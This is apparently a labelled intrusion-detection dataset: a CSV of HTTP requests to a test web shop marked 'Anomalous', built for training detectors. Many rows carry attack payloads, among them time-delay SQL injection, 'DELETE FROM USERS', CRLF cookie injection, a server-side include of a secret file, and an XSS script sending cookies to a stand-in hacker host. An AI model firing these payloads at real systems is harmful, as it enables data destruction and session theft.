Class,Method,URI,Host-Header,Host,Connection,Accept,Accept-Charset,Accept-Language,Cache-control,Cookie,Pragma,User-Agent,Content-Length,Content-Type,POST-Data,GET-Query
Anomalous,POST,/tienda1/publico/vaciar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=46192AF7243A977F6B4C216BB5AB508E,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),18,application/x-www-form-urlencoded,B2A=Vaciar+carrito,
Anomalous,POST,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=6D2A036D63E9CCB8047BDCB0A9783425,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),44,application/x-www-form-urlencoded,modo=insertar&precio=5878&B1A=Pasar+por+caja,
Anomalous,GET,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=1FDD91B17E68795672F0B5B4437A9B85,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E
Anomalous,POST,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=C72C17278C162FB5F74B2F2BA97D0A63,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),33,application/x-www-form-urlencoded,modo=%7C&precio=1611&B1=Confirmar,
Anomalous,GET,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=0594FC7A6C52DA77634DD98245053128,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=entrar%4040&login=carolien&pwd=p68vILl7Ja6&remember=on&B1=Entrar
Anomalous,GET,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=3B5EC013DE3EFADA95B69B80FFBC503F,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=insertar&precio=%253F&B1=Pasar+por+caja
Anomalous,GET,/tienda1/global/menum.jsp.Old,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=CD8FD500B8FC663C196177CC32DE2E33,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=559A4567438DDC62D781524A87409B2F,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),329,application/x-www-form-urlencoded,modo=registro&login=diahann&password=mARcel_iNo&nombre=Asad&apellidos=Tonato+Valle&email=grizzard%40ytv.com.mv&dni=75976186X&direccion=C%2F+Juan+De+Lara+115%2C+9%3FA&ciudad=Mazcuerras%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=43393&provincia=Valencia&ntc=8430846550683709&B1=Registrar,
Anomalous,GET,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=687A72FCDEF6E7F8AB45C770B04C9E79,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=registro&login=dirac&password=instRuIDor-a&nombre=Helvetia&apellidos=Tejera+Handal&email=poli%40pavimentosalagon.ga&dni=22640068H%2520&direccion=C%2F+Mangela+S%2FN%2C+&ciudad=Puras&cp=47360&provincia=Palencia&ntc=6085790746283877&B1=Registrar
Anomalous,GET,/tienda1/publico/vaciar.jsp.inc,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=9CCF82B89D41F8326E979C08A457965F,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,GET,/tienda1.Inc,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=631F11C8360DB70EA44504094EAA9B58,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,GET,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=334DC5907CCA58FFF5E4D7C9EE9EDFE4,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--
Anomalous,POST,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=AAA5BBA7EC1C6C13204D54F60691C258,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),243,application/x-www-form-urlencoded,modo=registro&login=calmenso&password=amanojada&nombre=%2FWilfred%3Fo&apellidos=Lazcano+Lujan&email=waldon%40blueeyes.tr&dni=69469940G&direccion=Calle+Coquina%2C+5%2C+&ciudad=Lecr%EDn&cp=47480&provincia=Girona&ntc=4840542188767205&B1=Registrar,
Anomalous,GET,.Old,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=85D3BB4C59119B0096767980620359CA,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,GET,/tienda1/index.jsp.Inc,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=A3137B08BE2E73AB38A111911C0E6292,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,GET,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=069490DD32D390AE973BF798E0FA42C2,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=entrar&login=heeralal0&pwd=mi%F1arse&remember=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Entrar
Anomalous,GET,/_cti_pvt/service.cnf,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=C957F84D28EF7F613F6A3904A7B233B3,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,GET,/IISSamples/sdk/asp/applications/Application_VBScript.asp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=DBCD0C9826D2D515EACAC32BB5A8B6BD,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,GET,/4861362529278789730,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=307BB181877D72AEB08B8565673B393D,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,GET,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=ECAD2E172352B1A22475F549FFF48C31,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=registro&login=%2Bkunja%2Bl&password=L63um2&nombre=Grazia&apellidos=Carstens&email=daele_roddan%40comonuevo.gg&dni=98695672G&direccion=Viriato+170%2C+&ciudad=Pinarnegrillo&cp=07810&provincia=M%E1laga&ntc=3975543619812448&B1=Registrar
Anomalous,GET,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=041B133CF1A2332EE812B762E5F28098,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=registro&login=roya&password=embRoCHAlAR&nombre=Abril&apellidos=Payet&email=renavat%40esmeraldas.org.museum&dni=78626447G&direccionA=Hospital+134+&ciudad=Buitrago&cp=37129&provincia=Alicante&ntc=3244353153112908&B1=Registrar
Anomalous,GET,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=B7D7CE644938A0412D902567A4572EE3,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=registro&login=maddox&password=9em6ll5r&nombre=Noel%ED+de+Lourdes&apellidos=Nadal+Ridaura&email=erlichman%40alquilerpantallasled.pe&dni=29678532E&direccion=C%2F+Rodriguez+Castillejo%2C+36%2C+8%3FH&ciudad=Sant+Fruit%F3s+de+Bages&cp=41001&provincia=Segovia&ntc=%252B&B1=Registrar
Anomalous,POST,/tienda1/publico/anadir.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=F613725F9B4EB0C31B24B1AB59844A4F,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),75,application/x-www-form-urlencoded,idA=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=14&B1=A%F1adir+al+carrito,
Anomalous,POST,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=7AB0CA2F640173D060D43AD4FAFC942B,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),261,application/x-www-form-urlencoded,modo=registro&login=hernzlia&password=dIF3MA79753&nombre=Osorio&apellidos=Mans+Vi%F1as&email=sone%40tristanyvioletina.nf&dni=70806659D&direccion=C%2F+Lago+Ba%F1olas+40+&ciudad=%22+AND+%221%22%3D%221&cp=41870&provincia=Cantabria&ntc=3259495581211566&B1=Registrar,
Anomalous,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=5ABAAF2D5A5142B9BEB161128BBF4E76,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),275,application/x-www-form-urlencoded,modo=registro&login=reiman&password=bO01q9265_TA&nombre=Malias&apellidosA=Orfila+Ochotorrena&email=hamshire_kell%40santcugatpisos.sj&dni=38449483S&direccion=Avda.+Arcangel%2C+98%2C+5%3FF&ciudad=Alc%E1zar+del+Rey&cp=31500&provincia=A+Coru%F1a&ntc=0056594046800438&B1=Registrar,
Anomalous,POST,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=8C2E18149D30C0417DA57E3FAB64C9CB,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),5,application/x-www-form-urlencoded,idA=2,
Anomalous,POST,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=1EFB2421863B5785233BCAD0BD8D6E6C,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),9,application/x-www-form-urlencoded,id=2%253F,
Anomalous,GET,/tienda1/publico/entrar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=7ED8F3C93BEE699BC81CC06EFDCCFD9F,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--
Anomalous,GET,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=4136E4E10E5F5003CDD2374C1AFB298F,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=registro&login=ukena0&password=alu43961543t0&nombre=Brunno&apellidos=Mazuecos+Sard%E0&email=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&dni=13053296Z&direccion=C%2F+Venus%2C+115%2C+&ciudad=Albelda&cp=15579&provincia=Valencia&ntc=1156001562245535&B1=Registrar
Anomalous,POST,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=7F15F4D1687D91782D23AA52AD385E50,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),258,application/x-www-form-urlencoded,modo=registro&loginA=mamie&password=mOnJA&nombre=Ecio&apellidos=Mendivil+Bellv%E9&email=wei%40alfombra.com.gw&dni=33914626E&direccion=Calle+Galera+7%2C+&ciudad=Cordobilla+de+L%E1cara&cp=03720&provincia=Santa+Cruz+de+Tenerife&ntc=6649652935543559&B1=Registrar,
Anomalous,GET,/asf-logo-wide,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=DA97BF697C5E1C2744A456F9F0071C97,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,GET,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=F2D91955FA46210FA910BD833ADD9D8F,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,idA=1
Anomalous,GET,/tienda1/publico/anadir.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=E3C8DD2C2148C662438A07B288C13DF9,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=49&B1=A%F1adir+al+carrito%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--
Anomalous,GET,/tienda1/publico/entrar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=2CD5362B22B0AF600337D165F97FF6FE,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,errorMsgA=Credenciales+incorrectas
Anomalous,GET,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=661985299A1E67638E6EB89B66A2E9C3,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=registro&login=gamaleld&password=t54p-4l&nombre=Shunko&apellidos=Volta+Piriz&email=guarneros%40elfisioencasa.eu&dni=78789686N&direccion=Menorca+13%2C+2%3FH&ciudad=Villagonzalo%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=31495&provincia=Granada&ntc=4253253341921904&B1=Registrar
Anomalous,GET,/tienda1/publico/autenticar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=6C3449364627163D118CCFBC8215A94A,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=entrar&login=cushing&pwd=614n3r9&remember=off&B1A=Entrar
Anomalous,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=C3CA5A2B3B81F032DC67475E0830D128,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),352,application/x-www-form-urlencoded,modo=registro&login=sorkin&password=engordadora&nombre=Shakira&apellidos=Mej%EDa+Ferr%E9s&email=boudaoudi-griffeth%40muchacha.com.dz&dni=13074085B&direccion=C%2F+Virgen+De+La+Paloma+31+12%3FH&ciudad=Pedroso+de+la+Armu%F1a%2C+El&cp=03277&provincia=Soria&ntc=2500333938712142&B1=Registrarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,
Anomalous,PUT,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:9090,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=512F78FEBEE17CA30C9C70B90400A612,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),4,application/x-www-form-urlencoded,id=1,
Anomalous,GET,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=4CE90528F841C3BF1CA1663EE715E233,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=insertar&precio=%253F&B1=Pasar+por+caja
Anomalous,GET,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=A8F06419871955A5324B3BBAC7CEA03A,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,id=2sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E
Anomalous,GET,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=2648E6EAD4EF7315BA52935602AFD623,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=insertar&precio=8792&B1=Pasar+por+cajaany%250ASet-cookie%253A%2BTamper%253D1041264011025374727
Anomalous,GET,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=8CC26E857312B9F64B7F324C30538F71,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,modo=registro&login=crozier&password=aborrecimiento&nombre=Ricardina&apellidos=Burch+Echaniz&email=hyer_longdon0%40artforall.mc&dni=62804007T&direccion=Plza.+Troyano+Salaverry%2C+42%2C+&ciudadA=Ch%F3var&cp=30500&provincia=Le%F3n&ntc=1229899553268508&B1=Registrar
Anomalous,GET,/tienda1/miembros/fotos.jsp/6909030637832563290.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=D41199EB20D85DF46F1CC22C5BB29CCF,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),,,,
Anomalous,POST,/tienda1/publico/anadir.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=4240BC55AAD7FF5A60FB92670B38CAC3,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),78,application/x-www-form-urlencoded,id=3&nombre=%27+DELETE+FROM+USERS&precio=39&cantidad=21&B1=A%F1adir+al+carrito,
Anomalous,POST,/tienda1/publico/pagar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=5831E5BC7DF05F3DDEAC84D15195CFED,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),40,application/x-www-form-urlencoded,modo=%252B&precio=1784&B1=Pasar+por+caja,
Anomalous,POST,/tienda1/publico/entrar.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=3ED7E8A896D854A81B205855C26F7021,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),34,application/x-www-form-urlencoded,errorMsgA=Credenciales+incorrectas,
Anomalous,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,JSESSIONID=2455E964B16B7FE9D68CFF4A24E918CC,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),259,application/x-www-form-urlencoded,modo=registro&login=clarence&password=VARoNA&nombre=Arnulfo&apellidos=Aniceto+Lacunza&email=polk%40tintaultravioleta.mx&dniA=52722813M&direccion=Calle+Infante+Don+Luis%2C+92+&ciudad=Ribes+de+Freser&cp=16122&provincia=Valencia&ntc=8960498379744557&B1=Registrar,
